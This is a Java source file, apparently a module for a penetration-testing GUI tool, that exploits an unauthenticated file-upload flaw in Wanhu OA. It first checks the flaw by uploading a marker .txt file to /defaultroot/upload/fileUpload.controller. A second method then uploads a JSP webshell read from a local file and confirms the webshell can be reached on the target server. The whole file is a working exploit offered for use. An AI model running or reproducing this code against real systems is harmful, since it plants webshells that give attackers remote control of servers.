package exp.oa.wanhuoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.util.Date;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class wanhu_fileUploadController_upload implements Exploitlnterface {
    private String filename;
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        HashMap<String, String> head = new HashMap<>();
        long t = (new Date()).getTime();
        String flag = t+"";
        head.put("Content-Type", "multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0");
        String post = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"R4gTest.txt\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n" + flag + "\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--";

        Response post1 = HttpTools.post(url + "/defaultroot/upload/fileUpload.controller", post, head, "utf-8");
        if (post1.getCode() == 200 && post1.getText().contains("success")) {
            //使用正则表达式抓取
            Pattern pattern = Pattern.compile("\\d+.txt");
            Matcher matcher = pattern.matcher(post1.getText().trim());
            while (matcher.find()) {
                filename = matcher.group();
                break;
            }
            Response response = HttpTools.get(url + "/defaultroot/upload/html/" + filename, new HashMap<String, String>(), "utf-8");
            if (response.getCode() == 200 && response.getText().contains(flag)) {

                Platform.runLater(() -> {
                    textArea.appendText("\n [ wanhu_fileUploadController_upload ]");
                    textArea.appendText("\n 文件上传成功: " + url + "/defaultroot/upload/html/" + filename+ " \n 访问成功: " + response.getText());
                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n");
            });
            return false;
        }
    }

    private Boolean attcmd(String url,String pass, TextArea textArea,TextArea textArea_cmd) {
        HashMap<String, String> head = new HashMap<>();
        long t = (new Date()).getTime();
        String flag = t+"";
        String shell_payload = Methods.readFile(pass);
        String payload = t+"\n" + shell_payload;
        head.put("Content-Type", "multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0");
        String post = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"R4gTest.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n" + payload + "\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--";

        Response post1 = HttpTools.post(url + "/defaultroot/upload/fileUpload.controller", post, head, "utf-8");
        if (post1.getCode() == 200 && post1.getText().contains("success")) {
            //使用正则表达式抓取
            Pattern pattern = Pattern.compile("\\d+.jsp");
            Matcher matcher = pattern.matcher(post1.getText().trim());
            while (matcher.find()) {
                filename = matcher.group();
                break;
            }
            Response response = HttpTools.get(url + "/defaultroot/upload/html/" + filename, new HashMap<String, String>(), "utf-8");
            if (response.getCode() == 200 && response.getText().contains(flag)) {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: \n"+url + "/defaultroot/upload/html/" + filename);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传失败");
                });
                return false;
            }

        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell上传失败");
            });
            return false;
        }
    }
}
